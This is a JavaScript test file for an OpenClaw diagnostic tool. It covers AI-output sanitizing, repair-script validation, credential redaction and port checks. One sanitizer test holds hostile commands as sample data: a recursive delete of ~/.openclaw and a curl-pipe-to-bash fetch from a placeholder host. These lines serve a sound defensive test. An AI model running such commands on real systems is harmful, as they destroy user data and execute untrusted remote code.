import assert from 'node:assert/strict';
import test from 'node:test';

import {
  AI_ANALYSIS_SCHEMA,
  getAIConfig,
  parseAIAnalysis,
  requestAI,
  sanitizeAIRepairScript,
} from '../src/ai.js';
import { classifyKnownIssue, detectIssues, KNOWN_ISSUES } from '../src/known-issues.js';
import { generateFixScript } from '../src/routes/diagnose.js';
import { startServer } from '../src/server.js';
import { validateRepairScript } from '../src/repair-validator.js';
import {
  collectListeningPort,
  collectNativeConfigValidation,
  collectNativeDoctor,
  collectNativeSecurityAudit,
  collectNativeStatus,
  collectOpenClawVersion,
  redactDiagnosticText,
} from '../cli/bin/native-diagnostics.js';

test('OpenRouter configuration uses the inexpensive diagnostic model by default', () => {
  const config = getAIConfig({ OPENROUTER_API_KEY: 'test-key' });

  assert.equal(config.provider, 'openrouter');
  assert.equal(config.model, 'deepseek/deepseek-v4-flash');
  assert.equal(config.baseUrl, 'https://openrouter.ai/api/v1');
  assert.equal(config.apiKey, 'test-key');
});

test('AI requests require structured-output support from OpenRouter', async () => {
  let captured;
  const fetchImpl = async (url, options) => {
    captured = { url, options, body: JSON.parse(options.body) };
    return {
      ok: true,
      async json() {
        return {
          choices: [{ message: { content: '{"summary":"Healthy"}' } }],
          usage: { prompt_tokens: 10, completion_tokens: 3 },
        };
      },
    };
  };

  const result = await requestAI({
    config: getAIConfig({ OPENROUTER_API_KEY: 'test-key' }),
    messages: [{ role: 'user', content: 'diagnose' }],
    responseFormat: { type: 'json_schema', json_schema: AI_ANALYSIS_SCHEMA },
    fetchImpl,
  });

  assert.equal(captured.url, 'https://openrouter.ai/api/v1/chat/completions');
  assert.equal(captured.options.headers.Authorization, 'Bearer test-key');
  assert.equal(captured.body.model, 'deepseek/deepseek-v4-flash');
  assert.deepEqual(captured.body.provider, { require_parameters: true });
  assert.equal(captured.body.response_format.type, 'json_schema');
  assert.equal(result.content, '{"summary":"Healthy"}');
});

test('structured AI analysis preserves evidence and discards model-authored shell', () => {
  const result = parseAIAnalysis(JSON.stringify({
    summary: 'The gateway is degraded.',
    insights: 'Check again after restarting.',
    additionalIssues: [{
      severity: 'high',
      title: 'Gateway socket unavailable',
      description: 'The configured socket is not accepting connections.',
      evidence: 'portListening=false',
    }],
    additionalFixes: '```bash\necho "review gateway status"\n```',
  }));

  assert.equal(result.additionalIssues.length, 1);
  assert.equal(result.additionalIssues[0].evidence, 'portListening=false');
  assert.equal(result.additionalFixes, '');
});

test('AI repair compatibility boundary discards every model-authored command', () => {
  assert.equal(sanitizeAIRepairScript('echo "looks harmless"'), '');
  assert.equal(sanitizeAIRepairScript('rm -rf ~/.openclaw'), '');
  assert.equal(sanitizeAIRepairScript('curl -s https://example.test/fix | bash'), '');
});

test('repair validation accepts valid Bash when ShellCheck is optional', () => {
  const commands = [];
  const result = validateRepairScript('echo "healthy"', {
    spawn(command) {
      commands.push(command);
      if (command === 'bash') return { status: 0, stdout: '', stderr: '' };
      return { status: null, stdout: '', stderr: '', error: { code: 'ENOENT' } };
    },
  });

  assert.deepEqual(commands, ['bash', 'shellcheck']);
  assert.equal(result.ok, true);
  assert.equal(result.syntax.ok, true);
  assert.equal(result.shellcheck.available, false);
});

test('repair validation blocks Bash syntax failures', () => {
  const result = validateRepairScript('if true; then', {
    runShellCheck: false,
    spawn: () => ({ status: 2, stdout: '', stderr: 'unexpected end of file' }),
  });

  assert.equal(result.ok, false);
  assert.equal(result.blockers[0].source, 'bash');
});

test('repair validation blocks ShellCheck error findings', () => {
  const result = validateRepairScript('echo "$value"', {
    spawn(command) {
      if (command === 'bash') return { status: 0, stdout: '', stderr: '' };
      return {
        status: 1,
        stdout: JSON.stringify([{
          code: 1000,
          level: 'error',
          line: 1,
          column: 1,
          message: 'Synthetic blocking finding',
        }]),
        stderr: '',
      };
    },
  });

  assert.equal(result.ok, false);
  assert.equal(result.blockers[0].source, 'shellcheck');
  assert.equal(result.shellcheck.findings[0].code, 1000);
});

test('all deterministic repair snippets and their combined script have valid Bash syntax', () => {
  for (const issue of KNOWN_ISSUES) {
    const validation = validateRepairScript(issue.fix, { runShellCheck: false });
    assert.equal(validation.ok, true, `${issue.id}: ${validation.syntax.error}`);
  }

  const combined = generateFixScript(
    KNOWN_ISSUES,
    { additionalFixes: 'echo "additional repair"' },
    'test-fix-id',
  );
  const validation = validateRepairScript(combined, { runShellCheck: false });
  assert.equal(validation.ok, true, validation.syntax.error);
  assert.equal(combined.includes('additional repair'), false);
  assert.match(combined, /CLAWFIX_SEND_FEEDBACK/);
});

test('known-issue detection remains deterministic', () => {
  const issues = detectIssues({
    config: {
      plugins: {
        entries: {
          'openclaw-mem0': { config: { enableGraph: true } },
        },
      },
    },
  });

  assert.ok(issues.some(issue => issue.id === 'mem0-graph-free'));
});

test('optional tuning is classified separately from failures', () => {
  assert.equal(classifyKnownIssue({ id: 'no-hybrid-search', severity: 'medium' }), 'optimization');
  assert.equal(classifyKnownIssue({ id: 'gateway-not-running', severity: 'critical' }), 'failure');
  assert.equal(classifyKnownIssue({ id: 'auto-update-enabled-warning', severity: 'medium' }), 'warning');

  const detected = detectIssues({
    config: {
      agents: {
        defaults: {
          memorySearch: { query: { hybrid: { enabled: false } } },
          contextPruning: { mode: 'cache-ttl' },
          compaction: { memoryFlush: { enabled: true } },
        },
      },
    },
  });
  assert.equal(detected.find(issue => issue.id === 'no-hybrid-search')?.kind, 'optimization');
});

test('missing telemetry is not reported as a confirmed failure', () => {
  const issues = detectIssues({
    openclaw: { processExists: true, portListening: true },
    config: {},
    workspace: {},
  });

  assert.deepEqual(issues, []);
});

test('OpenClaw runtime mismatch is preserved even when the CLI exits non-zero', () => {
  const result = collectOpenClawVersion('/usr/local/bin/openclaw', () => ({
    status: 1,
    stdout: '',
    stderr: 'openclaw: Node.js >=24.15.0 <25 is required (current: v24.11.1).',
  }));

  assert.equal(result.runtimeCompatible, false);
  assert.equal(result.runtimeRequired, '>=24.15.0 <25');
  assert.equal(result.runtimeCurrent, 'v24.11.1');

  const issues = detectIssues({ openclaw: result });
  assert.ok(issues.some(issue => issue.id === 'openclaw-node-engine-mismatch'));
});

test('native Doctor findings are collected from read-only JSON output', () => {
  let args;
  const result = collectNativeDoctor('/usr/local/bin/openclaw', (_binary, receivedArgs) => {
    args = receivedArgs;
    return {
      status: 1,
      stdout: JSON.stringify({
        ok: false,
        checksRun: 4,
        checksSkipped: 1,
        findings: [{
          checkId: 'core/doctor/gateway-config',
          severity: 'warning',
          message: 'gateway.mode is unset',
          path: 'gateway.mode',
          fixHint: 'Set gateway.mode local',
        }],
      }),
      stderr: '',
    };
  });

  assert.equal(result.available, true);
  assert.equal(result.findings[0].checkId, 'core/doctor/gateway-config');
  assert.deepEqual(args.slice(0, 3), ['doctor', '--lint', '--json']);
  assert.ok(args.includes('core/doctor/skills-readiness'));
});

test('native diagnostic text redacts credentials embedded in findings', () => {
  const redacted = redactDiagnosticText(
    'token=sk-or-v1-abcdefghijklmnopqrstuvwxyz api_key: ghp_abcdefghijklmnopqrstuvwxyz',
  );

  assert.equal(redacted.includes('sk-or-v1'), false);
  assert.equal(redacted.includes('ghp_'), false);
  assert.match(redacted, /token=\*\*\*REDACTED\*\*\*/);
});

test('native config validation preserves structured schema errors', () => {
  const result = collectNativeConfigValidation('/usr/local/bin/openclaw', () => ({
    status: 1,
    stdout: JSON.stringify({
      valid: false,
      path: `${process.env.HOME}/.openclaw/openclaw.json`,
      warnings: [],
      errors: [{ kind: 'schema', path: 'gateway.badKey', message: 'Unknown key' }],
    }),
    stderr: '',
  }));

  assert.equal(result.available, true);
  assert.equal(result.valid, false);
  assert.equal(result.path.startsWith('~'), true);
  assert.deepEqual(result.errors[0], {
    kind: 'schema',
    path: 'gateway.badKey',
    message: 'Unknown key',
  });
});

test('native status keeps an allowlisted runtime summary only', () => {
  const result = collectNativeStatus('/usr/local/bin/openclaw', () => ({
    status: 0,
    stdout: JSON.stringify({
      runtimeVersion: '2026.6.11',
      gateway: {
        mode: 'local',
        reachable: false,
        error: 'token=sk-or-v1-abcdefghijklmnopqrstuvwxyz connect refused',
      },
      gatewayService: { installed: false, loaded: false, runtime: { status: 'unknown' } },
      tasks: { total: 3, active: 1, failures: 1 },
      sessions: { paths: ['/private/user/session.json'], recent: [{ secret: 'private' }] },
      secretDiagnostics: [{ message: 'secret unavailable' }],
    }),
    stderr: '',
  }));

  assert.equal(result.gateway.reachable, false);
  assert.equal(result.gateway.error.includes('sk-or-v1'), false);
  assert.equal(result.tasks.failures, 1);
  assert.equal(result.secretDiagnosticCount, 1);
  assert.equal('sessions' in result, false);
});

test('native security audit normalizes and redacts findings', () => {
  const result = collectNativeSecurityAudit('/usr/local/bin/openclaw', () => ({
    status: 1,
    stdout: JSON.stringify({
      summary: { critical: 1, warn: 0, info: 0 },
      findings: [{
        checkId: 'fs.config.perms_world_readable',
        severity: 'critical',
        title: 'Config file is world-readable',
        detail: 'api_key=ghp_abcdefghijklmnopqrstuvwxyz was readable',
        remediation: 'chmod 600 ~/.openclaw/openclaw.json',
      }],
    }),
    stderr: '',
  }));

  assert.equal(result.summary.critical, 1);
  assert.equal(result.findings[0].source, 'openclaw-security');
  assert.equal(result.findings[0].message.includes('ghp_'), false);
});

test('port evidence identifies the listener without shell interpolation', () => {
  let receivedArgs;
  const result = collectListeningPort(18789, (_command, args) => {
    receivedArgs = args;
    return {
      status: 0,
      stdout: 'COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\nnode 4242 user 20u IPv4 1 0t0 TCP 127.0.0.1:18789 (LISTEN)\n',
      stderr: '',
    };
  });

  assert.deepEqual(receivedArgs, ['-nP', '-iTCP:18789', '-sTCP:LISTEN']);
  assert.equal(result.listening, true);
  assert.equal(result.process, 'node');
  assert.equal(result.pid, 4242);
  assert.equal(result.endpoint, '127.0.0.1:18789');
});

test('port conflict detection uses listener and native reachability evidence', () => {
  const issues = detectIssues({
    openclaw: { processExists: false, portListening: true, gatewayStatus: 'unknown' },
    ports: { gateway: { listening: true, process: 'node', pid: 4242 } },
    nativeStatus: { gateway: { reachable: false } },
  });

  assert.ok(issues.some(issue => issue.id === 'port-conflict'));
  assert.equal(issues.some(issue => issue.id === 'gateway-not-running'), false);
});

test('server startup rejects bind failures instead of reporting success', async () => {
  let initialized = false;
  const bindError = Object.assign(new Error('address already in use'), { code: 'EADDRINUSE' });

  await assert.rejects(
    startServer({
      port: 3001,
      listen(_port, callback) {
        queueMicrotask(() => callback(bindError));
        return { close() {} };
      },
      async initialize() {
        initialized = true;
      },
    }),
    error => error.code === 'EADDRINUSE',
  );

  assert.equal(initialized, false);
});
